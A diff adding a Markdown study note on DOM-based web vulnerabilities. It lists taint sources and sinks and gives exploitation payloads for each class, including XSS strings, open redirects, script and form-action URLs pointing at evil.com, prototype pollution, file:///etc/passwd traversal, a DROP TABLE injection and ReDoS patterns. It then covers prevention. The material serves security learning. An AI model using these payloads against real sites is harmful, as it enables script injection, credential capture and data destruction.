@@ -1,1 +1,321 @@
+## DOM-based Vulnerabilities
 
+- **What it is**
+  - Vulnerabilities that arise when JavaScript insecurely handles attacker-controllable data
+  - Based on the Document Object Model (DOM), a web browser's hierarchical representation of page elements
+  - Occur when a website takes a value from a source (attacker-controllable input) and passes it to a sink (dangerous function)
+  - Execute entirely on the client-side, often without server interaction
+  - Can lead to XSS, open redirects, cookie manipulation, and various other attacks
+
+- **Taint Flow Concept**
+  - **Sources**: JavaScript properties that accept potentially attacker-controlled data
+    - `location.search` (query string parameters)
+    - `location.hash` (URL fragment)
+    - `document.referrer` (referring URL)
+    - `document.URL` / `document.documentURI` (current URL)
+    - `document.cookie` (cookies)
+    - `localStorage` / `sessionStorage` (web storage)
+    - `window.name` (window name property)
+    - Web message events (`postMessage`)
+    - JSON data (`JSON.parse` results)
+    - `IndexedDB` data (browser database content)
+    - DOM attributes and HTML5 attributes
+    - Reflected and stored data from the server
+    
+  - **Sinks**: JavaScript functions or DOM objects that can cause undesirable effects if attacker-controlled data reaches them
+    - HTML manipulation functions (`innerHTML`, `outerHTML`, `document.write`)
+    - JavaScript execution functions (`eval`, `setTimeout`, `setInterval`)
+    - URL-related properties (`location`, `src`, `href`)
+    - Web storage functions (`setItem`)
+    - `postMessage` and message event handlers
+    - `document.domain` property
+    - `element.setAttribute` functions
+
+- **How to identify DOM-based vulnerabilities**
+  - Review client-side code for potential sources and sinks
+  - Look for JavaScript that:
+    - Reads from URL parameters, hashes, or other user-controllable sources
+    - Passes this data to dangerous sinks without proper validation
+  - Use browser developer tools to:
+    - Set breakpoints at potential sink functions
+    - Monitor execution flow with tainted data
+  - Test by manipulating source values and observing behavior
+  - Use automated tools like Burp Suite DOM Invader
+  - Check for event handlers and dynamic script generation
+
+- **Common DOM-based vulnerabilities and exploitation techniques**
+
+  - **DOM XSS (Cross-Site Scripting)**
+    - Occurs when client-side scripts write user-controllable data to the DOM without proper sanitization
+    - Common sinks:
+      - `innerHTML`, `outerHTML`, `document.write`, `document.writeln`
+      - jQuery functions: `html()`, `append()`, `prepend()`, `after()`, `before()`
+      - Angular: `ng-bind-html` without `$sanitize`
+      - React: `dangerouslySetInnerHTML`
+    - Exploitation examples:
+      - Basic payload: `?search=<img src=x onerror=alert(1)>`
+      - Event handler injection: `?input=x" onmouseover="alert(1)`
+      - JavaScript URL injection: `?url=javascript:alert(1)`
+      - Template literal injection: `${alert(1)}`
+    - Detection:
+      - Test inputs with special characters: `<>'"(){}`
+      - Observe if they're reflected without encoding
+      - Check how the application uses them in the DOM
+
+  - **DOM-based Open Redirection**
+    - Occurs when client-side JavaScript takes user input and uses it to perform a redirect
+    - Common sinks:
+      - `window.location`, `location.href`, `location.replace`, `location.assign`
+      - `location.pathname`, `location.search`, `location.hash`
+      - `window.open`, `document.URL`, `document.documentURI`
+      - `element.src`, `element.href` for certain elements
+    - Exploitation examples:
+      - Basic URL injection: `?redirect=https://evil.com`
+      - Protocol-relative URL: `?redirect=//evil.com`
+      - Path traversal bypass: `?redirect=/../../evil.com`
+      - JavaScript URL scheme: `?redirect=javascript:alert(document.domain)`
+    - Detection:
+      - Test redirection parameters with external domains
+      - Test with malformed URLs and observe behavior
+      - Monitor location-changing JavaScript events
+
+  - **DOM-based Cookie Manipulation**
+    - Occurs when JavaScript writes attacker-controlled data to document.cookie
+    - Common sinks:
+      - `document.cookie` (write operations)
+    - Exploitation examples:
+      - Overwriting cookies: `?param=;cookie1=malicious`
+      - Setting HttpOnly bypass: `?param=;user_data=modified`
+      - Cookie path poisoning: `?input=;path=/admin`
+      - Domain attribute manipulation: `?input=;domain=.example.com`
+    - Detection:
+      - Monitor cookie changes during interaction
+      - Check for JavaScript that writes to document.cookie
+      - Test inputs that appear in cookies after processing
+
+  - **JavaScript Injection**
+    - Similar to DOM XSS but involves directly executing JavaScript code
+    - Common sinks:
+      - `eval()`, `Function()`, `setTimeout()`, `setInterval()`
+      - `new Function()`, `WebAssembly.compile()`
+      - Indirect eval through methods like `window.execScript()`
+    - Exploitation examples:
+      - Direct code execution: `?input=alert(1)`
+      - String concatenation bypass: `?input=");alert(1);//`
+      - Template literal injection: `?input=${alert(1)}`
+      - Multistep injection using global variables
+    - Detection:
+      - Search for dangerous functions in source code
+      - Test inputs that may execute as code
+      - Monitor for dynamic code generation and execution
+
+  - **Document-domain Manipulation**
+    - Exploits JavaScript's ability to modify `document.domain`
+    - Common sinks:
+      - `document.domain` property
+    - Exploitation examples:
+      - Domain relaxation: `?domain=example.com`
+      - Unexpected parent domain setting: `?domain=attacker-controlled.com`
+    - Detection:
+      - Monitor for changes to `document.domain`
+      - Check for code that allows domain relaxation
+      - Test domain-related parameters
+
+  - **WebSocket-URL Poisoning**
+    - Occurs when WebSocket URLs are constructed using untrusted input
+    - Common sinks:
+      - `WebSocket()` constructor
+      - `new WebSocket()` calls
+    - Exploitation examples:
+      - Malicious WebSocket endpoint: `?socket=wss://evil.com`
+      - Protocol manipulation: `?socket=ws://internal.local`
+    - Detection:
+      - Check how WebSocket URLs are constructed
+      - Test URL parameters used in WebSocket connections
+      - Monitor WebSocket connection attempts
+
+  - **Link Manipulation**
+    - Occurs when URLs for resources and links are built with user input
+    - Common sinks:
+      - `element.src`, `element.href`, `element.action`
+      - `jQuery.attr()` when setting URL attributes
+    - Exploitation examples:
+      - Script src poisoning: `?script=https://evil.com/malicious.js`
+      - Form action tampering: `?action=https://evil.com/collect`
+      - Image source manipulation: `?img=https://evil.com/track.php`
+    - Detection:
+      - Monitor changes to URL-based attributes
+      - Test input reflection in src/href attributes
+      - Check for dynamic resource loading
+
+  - **Web Message Manipulation**
+    - Targets `postMessage()` and message event handlers
+    - Common sinks:
+      - `postMessage()` sender
+      - `message` event handlers that process data without validation
+    - Exploitation examples:
+      - Origin bypass: Send messages from controlled origin
+      - Type confusion: `?msg={"type":"malicious","payload":"alert(1)"}`
+      - Prototype pollution: `?msg={"__proto__":{"isAdmin":true}}`
+    - Detection:
+      - Check `postMessage` calls and message handlers
+      - Test message validation and origin checks
+      - Look for insecure message processing patterns
+
+  - **Ajax Request-Header Manipulation**
+    - Modifying HTTP headers in AJAX/fetch requests
+    - Common sinks:
+      - `setRequestHeader()` method
+      - Headers object in fetch API
+    - Exploitation examples:
+      - Custom header injection: `?header=X-CSRF-Token&value=bypass`
+      - Content-Type manipulation: `?contentType=text/xml`
+    - Detection:
+      - Monitor AJAX request header setting
+      - Test input reflection in HTTP headers
+      - Check for dynamic header generation
+
+  - **Local File-Path Manipulation**
+    - Controlling file system access in APIs that support it
+    - Common sinks:
+      - `FileReader.readAsText()`, `FileReader.readAsDataURL()`
+      - File APIs that accept paths or file objects
+    - Exploitation examples:
+      - Path traversal: `?file=../../../etc/passwd`
+      - File scheme URLs: `?file=file:///etc/passwd`
+    - Detection:
+      - Look for client-side file operations
+      - Test path parameters for directory traversal
+      - Monitor file access attempts
+
+  - **Client-side SQL Injection**
+    - Targeting client-side databases like Web SQL and IndexedDB
+    - Common sinks:
+      - `executeSql()` method
+      - SQL query string construction
+    - Exploitation examples:
+      - Basic SQL injection: `?id=1' OR '1'='1`
+      - Statement execution: `?query=; DROP TABLE users;--`
+    - Detection:
+      - Check for client-side database usage
+      - Test SQL parameter validation
+      - Monitor database query construction
+
+  - **HTML5-Storage Manipulation**
+    - Injecting malicious data into localStorage and sessionStorage
+    - Common sinks:
+      - `localStorage.setItem()`, `sessionStorage.setItem()`
+      - Direct property assignment to storage objects
+    - Exploitation examples:
+      - Persistent data poisoning: `?store=<img src=x onerror=alert(1)>`
+      - JSON data corruption: `?data={"admin":true,"username":"victim"}`
+    - Detection:
+      - Monitor storage operations
+      - Test how user input affects stored data
+      - Check for storage data validation
+
+  - **Client-side XPath Injection**
+    - Manipulating XPath queries with user input
+    - Common sinks:
+      - `document.evaluate()`
+      - XPath query string construction
+    - Exploitation examples:
+      - XPath injection: `?query=' or '1'='1]`
+      - Accessing unexpected nodes: `?xpath=//user[username='admin`
+    - Detection:
+      - Look for XPath usage in client-side code
+      - Test XPath parameter validation
+      - Monitor XPath query construction
+
+  - **Client-side JSON Injection**
+    - Manipulating JSON data passed to parsers
+    - Common sinks:
+      - `JSON.parse()`
+    - Exploitation examples:
+      - JSON data corruption: `?data={"isAdmin":true}`
+      - Prototype pollution: `?json={"__proto__":{"isAdmin":true}}`
+    - Detection:
+      - Check for dynamic JSON parsing
+      - Test JSON parameter validation
+      - Monitor for prototype pollution patterns
+
+  - **DOM-data Manipulation**
+    - Directly manipulating DOM properties and attributes
+    - Common sinks:
+      - `element.setAttribute()`
+      - Direct property assignment to DOM nodes
+    - Exploitation examples:
+      - Event handler injection: `?attr=onclick&value=alert(1)`
+      - Class/style manipulation: `?class=malicious-class`
+    - Detection:
+      - Monitor DOM attribute changes
+      - Test input reflection in element attributes
+      - Check for dynamic attribute manipulation
+
+  - **DOM Clobbering**
+    - Exploits naming collisions between HTML elements and JavaScript variables
+    - Uses HTML injection to override JavaScript object properties
+    - Common techniques:
+      - ID/name collision: Creating elements with IDs that match JavaScript variables
+      - Anchor element abuse: Exploiting `anchors` collection
+      - Form controls: Using form input names to override variables
+    - Exploitation examples:
+      - Basic DOM clobbering: `<a id="config" href="https://evil.com"></a>`
+      - Nested object clobbering: `<a id="utils"><a id="utils.settings" href="evil.js"></a></a>`
+      - Form input clobbering: `<input name="isAdmin" value="true">`
+    - Detection:
+      - Look for JavaScript using global variables without checks
+      - Test if HTML injection points allow element creation
+      - Check for DOM property access without safeguards
+
+  - **Denial of Service**
+    - Causing browser crashes or resource exhaustion
+    - Common sinks:
+      - `RegExp()` constructor with user input
+      - Resource-intensive operations
+    - Exploitation examples:
+      - ReDoS (Regular Expression DoS): `?regex=^(a+)+$&input=aaaaaaaaaaaaaaaaaaaaaaaaaa!`
+      - Infinite loops: `?iterations=999999999`
+    - Detection:
+      - Check for regex usage with user input
+      - Test resource-intensive operations
+      - Monitor for excessive CPU/memory usage
+
+- **Prevention techniques**
+
+  - **General prevention principles**
+    - Avoid passing data from sources to sinks whenever possible
+    - Implement a Content Security Policy (CSP)
+    - Use framework security features (Angular sanitization, React escaping)
+    - Apply defense in depth with multiple layers of protection
+
+  - **Input validation**
+    - Strictly validate input on the client-side
+    - Use allowlists rather than denylists
+    - Validate data type, length, format, and range
+    - Apply contextual validation based on the sink
+
+  - **Output encoding**
+    - HTML encode data inserted into HTML contexts
+    - JavaScript encode data used in JavaScript contexts
+    - URL encode data used in URL contexts
+    - Attribute encode data used in HTML attributes
+    - Use framework-provided encoding mechanisms
+
+  - **Safe APIs and libraries**
+    - Use `element.textContent` instead of `innerHTML`
+    - Prefer `setAttribute()` over direct property assignment for non-event handlers
+    - Use safe alternatives to `eval()` and `document.write()`
+    - Leverage framework security features like React's JSX escaping and Vue's template system
+
+  - **Framework-specific mitigations**
+    - Angular: Use Angular's built-in sanitization and DomSanitizer
+    - React: Avoid `dangerouslySetInnerHTML`, use JSX
+    - jQuery: Prefer `text()` over `html()` when displaying content
+    - Use template systems rather than direct DOM manipulation
+
+  - **Context-specific defenses**
+    - For URLs: Validate protocol, domain, and path
+    - For HTML: Apply appropriate encoding and consider using DOMPurify
+    - For JavaScript execution: Avoid dynamic code evaluation
+    - For storage: Validate and sanitize before storing and after retrieving
